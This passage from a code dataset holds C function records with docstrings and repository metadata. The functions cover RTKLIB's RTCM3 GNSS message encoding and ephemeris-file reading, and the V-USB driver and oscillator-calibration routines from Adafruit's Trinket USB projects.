half-cycle-amb indicator */\n    \n    rtcm->nbit=i;\n    return 1;\n}", "path": "Package2\\RTKLIB-2.4.2p13\\src\\rtcm3e.c", "repo_name": "Francklin2/RTKLIB_Touchscreen_GUI", "stars": 168, "license": "None", "language": "c", "size": 225224}
{"docstring": "/* encode ssr 4: combined orbit and clock corrections ------------------------*/\n", "func_signal": "static int encode_ssr4(rtcm_t *rtcm, int sys, int sync)", "code": "{\n    double udint=0.0;\n    int i,j,iod=0,nsat,prn,iode,iodcrc,refd=0,np,ni,nj,offp;\n    int deph[3],ddeph[3],dclk[3];\n    \n    trace(3,\"encode_ssr4: sys=%d sync=%d\\n\",sys,sync);\n    \n    switch (sys) {\n        case SYS_GPS: np=6; ni= 8; nj= 0; offp=  0; break;\n        case SYS_GLO: np=5; ni= 8; nj= 0; offp=  0; break;\n        case SYS_GAL: np=6; ni=10; nj= 0; offp=  0; break;\n        case SYS_QZS: np=4; ni= 8; nj= 0; offp=192; break;\n        case SYS_CMP: np=6; ni=10; nj=24; offp=  1; break;\n        case SYS_SBS: np=6; ni= 9; nj=24; offp=120; break;\n        default: return 0;\n    }\n    /* number of satellites */\n    for (j=nsat=0;j<MAXSAT;j++) {\n        if (satsys(j+1,&prn)!=sys||!rtcm->ssr[j].update) continue;\n        nsat++;\n        udint=rtcm->ssr[j].udi[0];\n        iod  =rtcm->ssr[j].iod[0];\n        refd =rtcm->ssr[j].refd;\n    }\n    /* encode ssr header */\n    i=encode_ssr_head(4,rtcm,sys,nsat,sync,iod,udint,refd,0,0);\n    \n    for (j=0;j<MAXSAT;j++) {\n        if (satsys(j+1,&prn)!=sys||!rtcm->ssr[j].update) continue;\n        \n        iode=rtcm->ssr[j].iode;\n        iodcrc=rtcm->ssr[j].iodcrc;\n        \n        deph [0]=ROUND(rtcm->ssr[j].deph [0]/1E-4);\n        deph [1]=ROUND(rtcm->ssr[j].deph [1]/4E-4);\n        deph [2]=ROUND(rtcm->ssr[j].deph [2]/4E-4);\n        ddeph[0]=ROUND(rtcm->ssr[j].ddeph[0]/1E-6);\n        ddeph[1]=ROUND(rtcm->ssr[j].ddeph[1]/4E-6);\n        ddeph[2]=ROUND(rtcm->ssr[j].ddeph[2]/4E-6);\n        dclk [0]=ROUND(rtcm->ssr[j].dclk [0]/1E-4);\n        dclk [1]=ROUND(rtcm->ssr[j].dclk [1]/1E-6);\n        dclk [2]=ROUND(rtcm->ssr[j].dclk [2]/1E-8);\n        \n        setbitu(rtcm->buff,i,np,prn-offp); i+=np; /* satellite id */\n        setbitu(rtcm->buff,i,ni,iode    ); i+=ni; /* iode */\n        setbitu(rtcm->buff,i,nj,iodcrc  ); i+=nj; /* iodcrc */\n        setbits(rtcm->buff,i,22,deph [0]); i+=22; /* delta raidal */\n        setbits(rtcm->buff,i,20,deph [1]); i+=20; /* delta along-track */\n        setbits(rtcm->buff,i,20,deph [2]); i+=20; /* delta cross-track */\n        setbits(rtcm->buff,i,21,ddeph[0]); i+=21; /* dot delta radial */\n        setbits(rtcm->buff,i,19,ddeph[1]); i+=19; /* dot delta along-track */\n        setbits(rtcm->buff,i,19,ddeph[2]); i+=19; /* dot delta cross-track */\n        setbits(rtcm->buff,i,22,dclk [0]); i+=22; /* delta clock c0 */\n        setbits(rtcm->buff,i,21,dclk [1]); i+=21; /* delta clock c1 */\n        setbits(rtcm->buff,i,27,dclk [2]); i+=27; /* delta clock c2 */\n    }\n    rtcm->nbit=i;\n    return 1;\n}", "path": "Package2\\RTKLIB-2.4.2p13\\src\\rtcm3e.c", "repo_name": "Francklin2/RTKLIB_Touchscreen_GUI", "stars": 168, "license": "None", "language": "c", "size": 225224}
{"docstring": "/* encode type 1001: basic L1-only gps rtk observables -----------------------*/\n", "func_signal": "static int encode_type1001(rtcm_t *rtcm, int sync)", "code": "{\n    int i,j,nsat=0,sys,prn;\n    int code1,pr1,ppr1,lock1,amb;\n    \n    trace(3,\"encode_type1001: sync=%d\\n\",sync);\n    \n    for (j=0;j<rtcm->obs.n&&nsat<MAXOBS;j++) {\n        sys=satsys(rtcm->obs.data[j].sat,&prn);\n        if (!(sys&(SYS_GPS|SYS_SBS))) continue;\n        nsat++;\n    }\n    /* encode header */\n    i=encode_head(1001,rtcm,SYS_GPS,sync,nsat);\n    \n    for (j=0;j<rtcm->obs.n&&nsat<MAXOBS;j++) {\n        sys=satsys(rtcm->obs.data[j].sat,&prn);\n        if (!(sys&(SYS_GPS|SYS_SBS))) continue;\n        \n        if (sys==SYS_SBS) prn-=80; /* 40-58: sbas 120-138 */\n        \n        /* generate obs field data gps */\n        gen_obs_gps(rtcm,rtcm->obs.data+j,&code1,&pr1,&ppr1,&lock1,&amb,NULL,\n                    NULL,NULL,NULL,NULL,NULL);\n        \n        setbitu(rtcm->buff,i, 6,prn  ); i+= 6;\n        setbitu(rtcm->buff,i, 1,code1); i+= 1;\n        setbitu(rtcm->buff,i,24,pr1  ); i+=24;\n        setbits(rtcm->buff,i,20,ppr1 ); i+=20;\n        setbitu(rtcm->buff,i, 7,lock1); i+= 7;\n    }\n    rtcm->nbit=i;\n    return 1;\n}", "path": "Package2\\RTKLIB-2.4.2p13\\src\\rtcm3e.c", "repo_name": "Francklin2/RTKLIB_Touchscreen_GUI", "stars": 168, "license": "None", "language": "c", "size": 225224}
{"docstring": "/* L2 code indicator gps -----------------------------------------------------*/\n", "func_signal": "static int to_code2_gps(unsigned char code)", "code": "{\n    switch (code) {\n        case CODE_L2C:\n        case CODE_L2S:\n        case CODE_L2L:\n        case CODE_L2X: return 0; /* L2 C/A or L2C */\n        case CODE_L2P:\n        case CODE_L2Y: return 1; /* L2 P(Y) direct */\n        case CODE_L2D: return 2; /* L2 P(Y) cross-correlated */\n        case CODE_L2W:\n        case CODE_L2N: return 3; /* L2 correlated P/Y */\n    }\n    return 0;\n}", "path": "Package2\\RTKLIB-2.4.2p13\\src\\rtcm3e.c", "repo_name": "Francklin2/RTKLIB_Touchscreen_GUI", "stars": 168, "license": "None", "language": "c", "size": 225224}
{"docstring": "/* read dcb parameters file --------------------------------------------------*/\n", "func_signal": "static int readdcbf(const char *file, nav_t *nav)", "code": "{\n    FILE *fp;\n    double cbias;\n    int sat,type=0;\n    char buff[256];\n    \n    trace(3,\"readdcbf: file=%s\\n\",file);\n    \n    if (!(fp=fopen(file,\"r\"))) {\n        trace(2,\"dcb parameters file open error: %s\\n\",file);\n        return 0;\n    }\n    while (fgets(buff,sizeof(buff),fp)) {\n        \n        if      (strstr(buff,\"DIFFERENTIAL (P1-P2) CODE BIASES\")) type=1;\n        else if (strstr(buff,\"DIFFERENTIAL (P1-C1) CODE BIASES\")) type=2;\n        else if (strstr(buff,\"DIFFERENTIAL (P2-C2) CODE BIASES\")) type=3;\n        \n        if (!type) continue;\n        \n        if (!(sat=satid2no(buff))||(cbias=str2num(buff,26,9))==0.0) continue;\n        \n        nav->cbias[sat-1][type-1]=cbias*1E-9*CLIGHT; /* ns -> m */\n    }\n    fclose(fp);\n    \n    return 1;\n}", "path": "Package2\\RTKLIB-2.4.2p13\\src\\preceph.c", "repo_name": "Francklin2/RTKLIB_Touchscreen_GUI", "stars": 168, "license": "None", "language": "c", "size": 225224}
{"docstring": "/* read sp3 precise ephemeris file ---------------------------------------------\n* read sp3 precise ephemeris/clock files and set them to navigation data\n* args   : char   *file       I   sp3-c precise ephemeris file\n*                                 (wind-card * is expanded)\n*          nav_t  *nav        IO  navigation data\n*          int    opt         I   options (1: only observed + 2: only predicted +\n*                                 4: not combined)\n* return : none\n* notes  : see ref [1]\n*          precise ephemeris is appended and combined\n*          nav->peph and nav->ne must by properly initialized before calling the\n*          function\n*          only files with extensions of .sp3, .SP3, .eph* and .EPH* are read\n*-----------------------------------------------------------------------------*/\n", "func_signal": "extern void readsp3(const char *file, nav_t *nav, int opt)", "code": "{\n    FILE *fp;\n    gtime_t time={0};\n    double bfact[2]={0};\n    int i,j,n,ns,sats[MAXSAT]={0};\n    char *efiles[MAXEXFILE],*ext,type=' ',tsys[4]=\"\";\n    \n    trace(3,\"readpephs: file=%s\\n\",file);\n    \n    for (i=0;i<MAXEXFILE;i++) {\n        if (!(efiles[i]=(char *)malloc(1024))) {\n            for (i--;i>=0;i--) free(efiles[i]);\n            return;\n        }\n    }\n    /* expand wild card in file path */\n    n=expath(file,efiles,MAXEXFILE);\n    \n    for (i=j=0;i<n;i++) {\n        if (!(ext=strrchr(efiles[i],'.'))) continue;\n        \n        if (!strstr(ext+1,\"sp3\")&&!strstr(ext+1,\".SP3\")&&\n            !strstr(ext+1,\"eph\")&&!strstr(ext+1,\".EPH\")) continue;\n        \n        if (!(fp=fopen(efiles[i],\"r\"))) {\n            trace(2,\"sp3 file open error %s\\n\",efiles[i]);\n            continue;\n        }\n        /* read sp3 header */\n        ns=readsp3h(fp,&time,&type,sats,bfact,tsys);\n        \n        /* read sp3 body */\n        readsp3b(fp,type,sats,ns,bfact,tsys,j++,opt,nav);\n        \n        fclose(fp);\n    }\n    for (i=0;i<MAXEXFILE;i++) free(efiles[i]);\n    \n    /* combine precise ephemeris */\n    if (nav->ne>0) combpeph(nav,opt);\n}", "path": "Package2\\RTKLIB-2.4.2p13\\src\\preceph.c", "repo_name": "Francklin2/RTKLIB_Touchscreen_GUI", "stars": 168, "license": "None", "language": "c", "size": 225224}
{"docstring": "/* encode msm header ---------------------------------------------------------*/\n", "func_signal": "static int encode_msm_head(int type, rtcm_t *rtcm, int sys, int sync, int *nsat,\n                           int *ncell, double *rrng, double *rrate,\n                           unsigned char *info, double *psrng, double *phrng,\n                           double *rate, double *lock, unsigned char *half,\n                           float *cnr)", "code": "{\n    double tow;\n    unsigned char sat_ind[64]={0},sig_ind[32]={0},cell_ind[32*64]={0};\n    unsigned int dow,epoch;\n    int i=24,j,nsig=0;\n    \n    switch (sys) {\n        case SYS_GPS: type+=1070; break;\n        case SYS_GLO: type+=1080; break;\n        case SYS_GAL: type+=1090; break;\n        case SYS_QZS: type+=1110; break;\n        case SYS_SBS: type+=1100; break;\n        case SYS_CMP: type+=1120; break;\n        default: return 0;\n    }\n    /* generate msm satellite, signal and cell index */\n    gen_msm_index(rtcm,sys,nsat,&nsig,ncell,sat_ind,sig_ind,cell_ind);\n    \n    if (sys==SYS_GLO) {\n        /* glonass time (dow + tod-ms) */\n        tow=time2gpst(timeadd(gpst2utc(rtcm->time),10800.0),NULL);\n        dow=(unsigned int)(tow/86400.0);\n        epoch=(dow<<27)+ROUND_U(fmod(tow,86400.0)*1E3);\n    }\n    else if (sys==SYS_CMP) {\n        /* beidou time (tow-ms) */\n        epoch=ROUND_U(time2gpst(gpst2bdt(rtcm->time),NULL)*1E3);\n    }\n    else {\n        /* gps, qzs and galileo time (tow-ms) */\n        epoch=ROUND_U(time2gpst(rtcm->time,NULL)*1E3);\n    }\n    /* encode msm header (ref [15] table 3.5-78) */\n    setbitu(rtcm->buff,i,12,type       ); i+=12; /* message number */\n    setbitu(rtcm->buff,i,12,rtcm->staid); i+=12; /* reference station id */\n    setbitu(rtcm->buff,i,30,epoch      ); i+=30; /* epoch time */\n    setbitu(rtcm->buff,i, 1,sync       ); i+= 1; /* multiple message bit */\n    setbitu(rtcm->buff,i, 3,rtcm->seqno); i+= 3; /* issue of data station */\n    setbitu(rtcm->buff,i, 7,0          ); i+= 7; /* reserved */\n    setbitu(rtcm->buff,i, 2,0          ); i+= 2; /* clock streering indicator */\n    setbitu(rtcm->buff,i, 2,0          ); i+= 2; /* external clock indicator */\n    setbitu(rtcm->buff,i, 1,0          ); i+= 1; /* smoothing indicator */\n    setbitu(rtcm->buff,i, 3,0          ); i+= 3; /* smoothing interval */\n    \n    /* satellite mask */\n    for (j=0;j<64;j++) {\n        setbitu(rtcm->buff,i,1,sat_ind[j]?1:0); i+=1;\n    }\n    /* signal mask */\n    for (j=0;j<32;j++) {\n        setbitu(rtcm->buff,i,1,sig_ind[j]?1:0); i+=1;\n    }\n    /* cell mask */\n    for (j=0;j<*nsat*nsig&&j<64;j++) {\n        setbitu(rtcm->buff,i,1,cell_ind[j]?1:0); i+=1;\n    }\n    /* generate msm satellite data fields */\n    gen_msm_sat(rtcm,sys,*nsat,sat_ind,rrng,rrate,info);\n    \n    /* generate msm signal data fields */\n    gen_msm_sig(rtcm,sys,*nsat,nsig,*ncell,sat_ind,sig_ind,cell_ind,rrng,rrate,\n                psrng,phrng,rate,lock,half,cnr);\n    \n    return i;\n}", "path": "Package2\\RTKLIB-2.4.2p13\\src\\rtcm3e.c", "repo_name": "Francklin2/RTKLIB_Touchscreen_GUI", "stars": 168, "license": "None", "language": "c", "size": 225224}
{"docstring": "/* encode fine pseudorange ---------------------------------------------------*/\n", "func_signal": "static int encode_msm_psrng(rtcm_t *rtcm, int i, const double *psrng, int ncell)", "code": "{\n    int j,psrng_val;\n    \n    for (j=0;j<ncell;j++) {\n        if (psrng[j]==0.0) {\n            psrng_val=-16384;\n        }\n        else if (fabs(psrng[j])>292.7) {\n            trace(2,\"msm fine pseudorange overflow %s psrng=%.3f\\n\",\n                 time_str(rtcm->time,0),psrng[j]);\n            psrng_val=-16384;\n        }\n        else {\n            psrng_val=ROUND(psrng[j]/RANGE_MS/P2_24);\n        }\n        setbits(rtcm->buff,i,15,psrng_val); i+=15;\n    }\n    return i;\n}", "path": "Package2\\RTKLIB-2.4.2p13\\src\\rtcm3e.c", "repo_name": "Francklin2/RTKLIB_Touchscreen_GUI", "stars": 168, "license": "None", "language": "c", "size": 225224}
{"docstring": "/* observation code to msm signal id -----------------------------------------*/\n", "func_signal": "static int to_sigid(int sys, unsigned char code, int *freq)", "code": "{\n    const char **msm_sig;\n    char *sig;\n    int i;\n    \n    /* signal conversion for undefined signal by rtcm */\n    if (sys==SYS_GPS) {\n        if      (code==CODE_L1Y) code=CODE_L1P;\n        else if (code==CODE_L1M) code=CODE_L1P;\n        else if (code==CODE_L1N) code=CODE_L1P;\n        else if (code==CODE_L2D) code=CODE_L2P;\n        else if (code==CODE_L2Y) code=CODE_L2P;\n        else if (code==CODE_L2M) code=CODE_L2P;\n        else if (code==CODE_L2N) code=CODE_L2P;\n    }\n    if (!*(sig=code2obs(code,freq))) return 0;\n    \n    switch (sys) {\n        case SYS_GPS: msm_sig=msm_sig_gps; break;\n        case SYS_GLO: msm_sig=msm_sig_glo; break;\n        case SYS_GAL: msm_sig=msm_sig_gal; break;\n        case SYS_QZS: msm_sig=msm_sig_qzs; break;\n        case SYS_SBS: msm_sig=msm_sig_sbs; break;\n        case SYS_CMP: msm_sig=msm_sig_cmp; break;\n        default: return 0;\n    }\n    /* freqency index for beidou */\n    if (sys==SYS_CMP) {\n        if      (*freq==5) *freq=2; /* B2 */\n        else if (*freq==4) *freq=3; /* B3 */\n    }\n    for (i=0;i<32;i++) {\n        if (!strcmp(sig,msm_sig[i])) return i+1;\n    }\n    return 0;\n}", "path": "Package2\\RTKLIB-2.4.2p13\\src\\rtcm3e.c", "repo_name": "Francklin2/RTKLIB_Touchscreen_GUI", "stars": 168, "license": "None", "language": "c", "size": 225224}
{"docstring": "/* encode signal cnr ---------------------------------------------------------*/\n", "func_signal": "static int encode_msm_cnr(rtcm_t *rtcm, int i, const float *cnr, int ncell)", "code": "{\n    int j,cnr_val;\n    \n    for (j=0;j<ncell;j++) {\n        cnr_val=ROUND(cnr[j]/1.0);\n        setbitu(rtcm->buff,i,6,cnr_val); i+=6;\n    }\n    return i;\n}", "path": "Package2\\RTKLIB-2.4.2p13\\src\\rtcm3e.c", "repo_name": "Francklin2/RTKLIB_Touchscreen_GUI", "stars": 168, "license": "None", "language": "c", "size": 225224}
{"docstring": "/* usbBuildTxBlock() is called when we have data to transmit and the\n * interrupt routine's transmit buffer is empty.\n */\n", "func_signal": "static inline void usbBuildTxBlock(void)", "code": "{\nusbMsgLen_t wantLen;\nuchar       len;\n\n    wantLen = usbMsgLen;\n    if(wantLen > 8)\n        wantLen = 8;\n    usbMsgLen -= wantLen;\n    usbTxBuf[0] ^= USBPID_DATA0 ^ USBPID_DATA1; /* DATA toggling */\n    len = usbDeviceRead(usbTxBuf + 1, wantLen);\n    if(len <= 8){           /* valid data packet */\n        usbCrc16Append(&usbTxBuf[1], len);\n        len += 4;           /* length including sync byte */\n        if(len < 12)        /* a partial package identifies end of message */\n            usbMsgLen = USB_NO_MSG;\n    }else{\n        len = USBPID_STALL;   /* stall the endpoint */\n        usbMsgLen = USB_NO_MSG;\n    }\n    usbTxLen = len;\n    DBG2(0x20, usbTxBuf, len-1);\n}", "path": "TrinketFakeUsbSerial\\usbdrv\\usbdrv.c", "repo_name": "adafruit/Adafruit-Trinket-USB", "stars": 204, "license": "None", "language": "c", "size": 2903}
{"docstring": "/* usbProcessRx() is called for every message received by the interrupt\n * routine. It distinguishes between SETUP and DATA packets and processes\n * them accordingly.\n */\n", "func_signal": "static inline void usbProcessRx(uchar *data, uchar len)", "code": "{\nusbRequest_t    *rq = (void *)data;\n\n/* usbRxToken can be:\n * 0x2d 00101101 (USBPID_SETUP for setup data)\n * 0xe1 11100001 (USBPID_OUT: data phase of setup transfer)\n * 0...0x0f for OUT on endpoint X\n */\n    DBG2(0x10 + (usbRxToken & 0xf), data, len + 2); /* SETUP=1d, SETUP-DATA=11, OUTx=1x */\n    USB_RX_USER_HOOK(data, len)\n#if USB_CFG_IMPLEMENT_FN_WRITEOUT\n    if(usbRxToken < 0x10){  /* OUT to endpoint != 0: endpoint number in usbRxToken */\n        usbFunctionWriteOut(data, len);\n        return;\n    }\n#endif\n    if(usbRxToken == (uchar)USBPID_SETUP){\n        if(len != 8)    /* Setup size must be always 8 bytes. Ignore otherwise. */\n            return;\n        usbMsgLen_t replyLen;\n        usbTxBuf[0] = USBPID_DATA0;         /* initialize data toggling */\n        usbTxLen = USBPID_NAK;              /* abort pending transmit */\n        usbMsgFlags = 0;\n        uchar type = rq->bmRequestType & USBRQ_TYPE_MASK;\n        if(type != USBRQ_TYPE_STANDARD){    /* standard requests are handled by driver */\n            replyLen = usbFunctionSetup(data);\n        }else{\n            replyLen = usbDriverSetup(rq);\n        }\n#if USB_CFG_IMPLEMENT_FN_READ || USB_CFG_IMPLEMENT_FN_WRITE\n        if(replyLen == USB_NO_MSG){         /* use user-supplied read/write function */\n            /* do some conditioning on replyLen, but on IN transfers only */\n            if((rq->bmRequestType & USBRQ_DIR_MASK) != USBRQ_DIR_HOST_TO_DEVICE){\n                if(sizeof(replyLen) < sizeof(rq->wLength.word)){ /* help compiler with optimizing */\n                    replyLen = rq->wLength.bytes[0];\n                }else{\n                    replyLen = rq->wLength.word;\n                }\n            }\n            usbMsgFlags = USB_FLG_USE_USER_RW;\n        }else   /* The 'else' prevents that we limit a replyLen of USB_NO_MSG to the maximum transfer len. */\n#endif\n        if(sizeof(replyLen) < sizeof(rq->wLength.word)){ /* help compiler with optimizing */\n            if(!rq->wLength.bytes[1] && replyLen > rq->wLength.bytes[0])    /* limit length to max */\n                replyLen = rq->wLength.bytes[0];\n        }else{\n            if(replyLen > rq->wLength.word)     /* limit length to max */\n                replyLen = rq->wLength.word;\n        }\n        usbMsgLen = replyLen;\n    }else{  /* usbRxToken must be USBPID_OUT, which means data phase of setup (control-out) */\n#if USB_CFG_IMPLEMENT_FN_WRITE\n        if(usbMsgFlags & USB_FLG_USE_USER_RW){\n            uchar rval = usbFunctionWrite(data, len);\n            if(rval == 0xff){   /* an error occurred */\n                usbTxLen = USBPID_STALL;\n            }else if(rval != 0){    /* This was the final package */\n                usbMsgLen = 0;  /* answer with a zero-sized data packet */\n            }\n        }\n#endif\n    }\n}", "path": "TrinketFakeUsbSerial\\usbdrv\\usbdrv.c", "repo_name": "adafruit/Adafruit-Trinket-USB", "stars": 204, "license": "None", "language": "c", "size": 2903}
{"docstring": "/* ------------------------------------------------------------------------- */\n", "func_signal": "static inline void usbHandleResetHook(uchar notResetState)", "code": "{\n#ifdef USB_RESET_HOOK\nstatic uchar    wasReset;\nuchar           isReset = !notResetState;\n\n    if(wasReset != isReset){\n        USB_RESET_HOOK(isReset);\n        wasReset = isReset;\n    }\n#else\n    notResetState = notResetState;  // avoid compiler warning\n#endif\n}", "path": "TrinketFakeUsbSerial\\usbdrv\\usbdrv.c", "repo_name": "adafruit/Adafruit-Trinket-USB", "stars": 204, "license": "None", "language": "c", "size": 2903}
{"docstring": "/* ------------------------ Oscillator Calibration ------------------------- */\n/* ------------------------------------------------------------------------- */\n// section copied from EasyLogger\n/* Calibrate the RC oscillator to 8.25 MHz. The core clock of 16.5 MHz is\n * derived from the 66 MHz peripheral clock by dividing. Our timing reference\n * is the Start Of Frame signal (a single SE0 bit) available immediately after\n * a USB RESET. We first do a binary search for the OSCCAL value and then\n * optimize this value with a neighboorhod search.\n * This algorithm may also be used to calibrate the RC oscillator directly to\n * 12 MHz (no PLL involved, can therefore be used on almost ALL AVRs), but this\n * is wide outside the spec for the OSCCAL value and the required precision for\n * the 12 MHz clock! Use the RC oscillator calibrated to 12 MHz for\n * experimental purposes only!\n */\n", "func_signal": "void calibrateOscillator(void)", "code": "{\n    uchar       step = 128;\n    uchar       trialValue = 0, optimumValue;\n    int         x, optimumDev, targetValue = (unsigned)(1499 * (double)F_CPU / 10.5e6 + 0.5);\n\n    /* do a binary search: */\n    do{\n        OSCCAL = trialValue + step;\n        x = usbMeasureFrameLength();    /* proportional to current real frequency */\n        if(x < targetValue)             /* frequency still too low */\n            trialValue += step;\n        step >>= 1;\n    }while(step > 0);\n    /* We have a precision of +/- 1 for optimum OSCCAL here */\n    /* now do a neighborhood search for optimum value */\n    optimumValue = trialValue;\n    optimumDev = x; /* this is certainly far away from optimum */\n    for(OSCCAL = trialValue - 1; OSCCAL <= trialValue + 1; OSCCAL++){\n        x = usbMeasureFrameLength() - targetValue;\n        if(x < 0)\n            x = -x;\n        if(x < optimumDev){\n            optimumDev = x;\n            optimumValue = OSCCAL;\n        }\n    }\n    OSCCAL = optimumValue;\n}", "path": "TrinketMouse\\TrinketMouseC.c", "repo_name": "adafruit/Adafruit-Trinket-USB", "stars": 204, "license": "None", "language": "c", "size": 2903}
{"docstring": "// caps/num/scroll lock LEDs\n", "func_signal": "void usbBegin()", "code": "{\n\tcli();\n\n\t// run at full speed, because Trinket defaults to 8MHz for low voltage compatibility reasons\n\tclock_prescale_set(clock_div_1);\n\n\t// fake a disconnect to force the computer to re-enumerate\n\tPORTB &= ~(_BV(USB_CFG_DMINUS_BIT) | _BV(USB_CFG_DPLUS_BIT));\n\tusbDeviceDisconnect();\n\t_delay_ms(250);\n\tusbDeviceConnect();\n\n\t// start the USB driver\n\tusbInit();\n\tsei();\n}", "path": "TrinketHidCombo\\TrinketHidComboC.c", "repo_name": "adafruit/Adafruit-Trinket-USB", "stars": 204, "license": "None", "language": "c", "size": 2903}
{"docstring": "/* ------------------------------------------------------------------------- */\n", "func_signal": "USB_PUBLIC void usbInit(void)", "code": "{\n#if USB_INTR_CFG_SET != 0\n    USB_INTR_CFG |= USB_INTR_CFG_SET;\n#endif\n#if USB_INTR_CFG_CLR != 0\n    USB_INTR_CFG &= ~(USB_INTR_CFG_CLR);\n#endif\n    USB_INTR_ENABLE |= (1 << USB_INTR_ENABLE_BIT);\n    usbResetDataToggling();\n#if USB_CFG_HAVE_INTRIN_ENDPOINT && !USB_CFG_SUPPRESS_INTR_CODE\n    usbTxLen1 = USBPID_NAK;\n#if USB_CFG_HAVE_INTRIN_ENDPOINT3\n    usbTxLen3 = USBPID_NAK;\n#endif\n#endif\n}", "path": "TrinketKeyboard\\usbdrv\\usbdrv.c", "repo_name": "adafruit/Adafruit-Trinket-USB", "stars": 204, "license": "None", "language": "c", "size": 2903}
{"docstring": "/* ------------------------------------------------------------------------- */\n", "func_signal": "USB_PUBLIC void usbInit(void)", "code": "{\n#if USB_INTR_CFG_SET != 0\n    USB_INTR_CFG |= USB_INTR_CFG_SET;\n#endif\n#if USB_INTR_CFG_CLR != 0\n    USB_INTR_CFG &= ~(USB_INTR_CFG_CLR);\n#endif\n    USB_INTR_ENABLE |= (1 << USB_INTR_ENABLE_BIT);\n    usbResetDataToggling();\n#if USB_CFG_HAVE_INTRIN_ENDPOINT && !USB_CFG_SUPPRESS_INTR_CODE\n    usbTxLen1 = USBPID_NAK;\n#if USB_CFG_HAVE_INTRIN_ENDPOINT3\n    usbTxLen3 = USBPID_NAK;\n#endif\n#endif\n}", "path": "TrinketFakeUsbSerial\\usbdrv\\usbdrv.c", "repo_name": "adafruit/Adafruit-Trinket-USB", "stars": 204, "license": "None", "language": "c", "size": 2903}
{"docstring": "/* ------------------------------------------------------------------------- */\n", "func_signal": "USB_PUBLIC void usbPoll(void)", "code": "{\nschar   len;\nuchar   i;\n\n    len = usbRxLen - 3;\n    if(len >= 0){\n/* We could check CRC16 here -- but ACK has already been sent anyway. If you\n * need data integrity checks with this driver, check the CRC in your app\n * code and report errors back to the host. Since the ACK was already sent,\n * retries must be handled on application level.\n * unsigned crc = usbCrc16(buffer + 1, usbRxLen - 3);\n */\n        usbProcessRx(usbRxBuf + USB_BUFSIZE + 1 - usbInputBufOffset, len);\n#if USB_CFG_HAVE_FLOWCONTROL\n        if(usbRxLen > 0)    /* only mark as available if not inactivated */\n            usbRxLen = 0;\n#else\n        usbRxLen = 0;       /* mark rx buffer as available */\n#endif\n    }\n    if(usbTxLen & 0x10){    /* transmit system idle */\n        if(usbMsgLen != USB_NO_MSG){    /* transmit data pending? */\n            usbBuildTxBlock();\n        }\n    }\n    for(i = 20; i > 0; i--){\n        uchar usbLineStatus = USBIN & USBMASK;\n        if(usbLineStatus != 0)  /* SE0 has ended */\n            goto isNotReset;\n    }\n    /* RESET condition, called multiple times during reset */\n    usbNewDeviceAddr = 0;\n    usbDeviceAddr = 0;\n    usbResetStall();\n    DBG1(0xff, 0, 0);\nisNotReset:\n    usbHandleResetHook(i);\n}", "path": "TrinketKeyboard\\usbdrv\\usbdrv.c", "repo_name": "adafruit/Adafruit-Trinket-USB", "stars": 204, "license": "None", "language": "c", "size": 2903}
{"docstring": "/* ------------------------------------------------------------------------- */\n", "func_signal": "static inline void  usbResetDataToggling(void)", "code": "{\n#if USB_CFG_HAVE_INTRIN_ENDPOINT && !USB_CFG_SUPPRESS_INTR_CODE\n    USB_SET_DATATOKEN1(USB_INITIAL_DATATOKEN);  /* reset data toggling for interrupt endpoint */\n#   if USB_CFG_HAVE_INTRIN_ENDPOINT3\n    USB_SET_DATATOKEN3(USB_INITIAL_DATATOKEN);  /* reset data toggling for interrupt endpoint */\n#   endif\n#endif\n}", "path": "TrinketKeyboard\\usbdrv\\usbdrv.c", "repo_name": "adafruit/Adafruit-Trinket-USB", "stars": 204, "license": "None", "language": "c", "size": 2903}
{"docstring": "/* ------------------------ Oscillator Calibration ------------------------- */\n/* ------------------------------------------------------------------------- */\n// section copied from EasyLogger\n/* Calibrate the RC oscillator to 8.25 MHz. The core clock of 16.5 MHz is\n * derived from the 66 MHz peripheral clock by dividing. Our timing reference\n * is the Start Of Frame signal (a single SE0 bit) available immediately after\n * a USB RESET. We first do a binary search for the OSCCAL value and then\n * optimize this value with a neighboorhod search.\n * This algorithm may also be used to calibrate the RC oscillator directly to\n * 12 MHz (no PLL involved, can therefore be used on almost ALL AVRs), but this\n * is wide outside the spec for the OSCCAL value and the required precision for\n * the 12 MHz clock! Use the RC oscillator calibrated to 12 MHz for\n * experimental purposes only!\n */\n", "func_signal": "void calibrateOscillator(void)", "code": "{\n    uchar       step = 128;\n    uchar       trialValue = 0, optimumValue;\n    int         x, optimumDev, targetValue = (unsigned)(1499 * (double)F_CPU / 10.5e6 + 0.5);\n\n    /* do a binary search: */\n    do{\n        OSCCAL = trialValue + step;\n        x = usbMeasureFrameLength();    /* proportional to current real frequency */\n        if(x < targetValue)             /* frequency still too low */\n            trialValue += step;\n        step >>= 1;\n    }while(step > 0);\n    /* We have a precision of +/- 1 for optimum OSCCAL here */\n    /* now do a neighborhood search for optimum value */\n    optimumValue = trialValue;\n    optimumDev = x; /* this is certainly far away from optimum */\n    for(OSCCAL = trialValue - 1; OSCCAL <= trialValue + 1; OSCCAL++){\n        x = usbMeasureFrameLength() - targetValue;\n        if(x < 0)\n            x = -x;\n        if(x < optimumDev){\n            optimumDev = x;\n            optimumValue = OSCCAL;\n        }\n    }\n    OSCCAL = optimumValue;\n}", "path": "TrinketHidCombo\\TrinketHidComboC.c", "repo_name": "adafruit/Adafruit-Trinket-USB", "stars": 204, "license": "None", "language": "c", "size": 2903}
{"docstring": "/* usbDriverSetup() is similar to usbFunctionSetup(), but it's used for\n * standard requests instead of class and custom requests.\n */\n", "func_signal": "static inline usbMsgLen_t usbDriverSetup(usbRequest_t *rq)", "code": "{\nusbMsgLen_t len = 0;\nuchar   *dataPtr = usbTxBuf + 9;    /* there are 2 bytes free space at the end of the buffer */\nuchar   value = rq->wValue.bytes[0];\n#if USB_CFG_IMPLEMENT_HALT\nuchar   index = rq->wIndex.bytes[0];\n#endif\n\n    dataPtr[0] = 0; /* default reply common to USBRQ_GET_STATUS and USBRQ_GET_INTERFACE */\n    SWITCH_START(rq->bRequest)\n    SWITCH_CASE(USBRQ_GET_STATUS)           /* 0 */\n        uchar recipient = rq->bmRequestType & USBRQ_RCPT_MASK;  /* assign arith ops to variables to enforce byte size */\n        if(USB_CFG_IS_SELF_POWERED && recipient == USBRQ_RCPT_DEVICE)\n            dataPtr[0] =  USB_CFG_IS_SELF_POWERED;\n#if USB_CFG_IMPLEMENT_HALT\n        if(recipient == USBRQ_RCPT_ENDPOINT && index == 0x81)   /* request status for endpoint 1 */\n            dataPtr[0] = usbTxLen1 == USBPID_STALL;\n#endif\n        dataPtr[1] = 0;\n        len = 2;\n#if USB_CFG_IMPLEMENT_HALT\n    